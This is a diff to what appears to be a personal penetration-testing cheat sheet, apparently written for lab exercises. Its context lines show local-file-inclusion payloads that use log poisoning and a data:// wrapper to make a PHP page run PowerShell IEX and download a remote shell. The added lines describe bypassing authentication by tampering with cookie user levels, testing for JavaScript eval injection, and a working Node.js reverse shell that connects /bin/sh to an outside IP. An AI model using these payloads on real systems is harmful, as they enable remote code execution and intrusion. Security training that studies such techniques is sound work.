@@ -294,6 +294,41 @@ nc -nv 192.168.136.10 80
 192.168.136.10/menu.php?file=c:/xampp/apache/logs/access.log&cmd=powershell%20IEX%20((New-Object%20Net.WebClient).DownloadString(%27http://192.168.119.136/shell%27))
 http://192.168.136.10/menu.php?file=data:text/plain,%3C?php%20echo%20shell_exec(%22powershell%20IEX%20((New-Object%20Net.WebClient).DownloadString(%27http://192.168.119.136/shell%27))%22)%20?%3E
 ```
+# Burp Cookies and User levels
+```bash
+base64 uncoded user levels? Check
+Change logic to be true to bypass authentication
+```
+
+# Java NodeJS functions 
+```bash
+Check if simple strings get evaluated by a function
+2+2
+Does it print 2+2 or does it say 4?
+
+More complicated
+-----------------
+(function(){
+   return 2+2;
+})();
+
+Reverse Shell
+----------------
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(21, "192.168.49.103", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+
+```
+
 ##### Other PHP Wrappers
 ````
 expect wrapper is disabled by default but can prove very useful if enabled
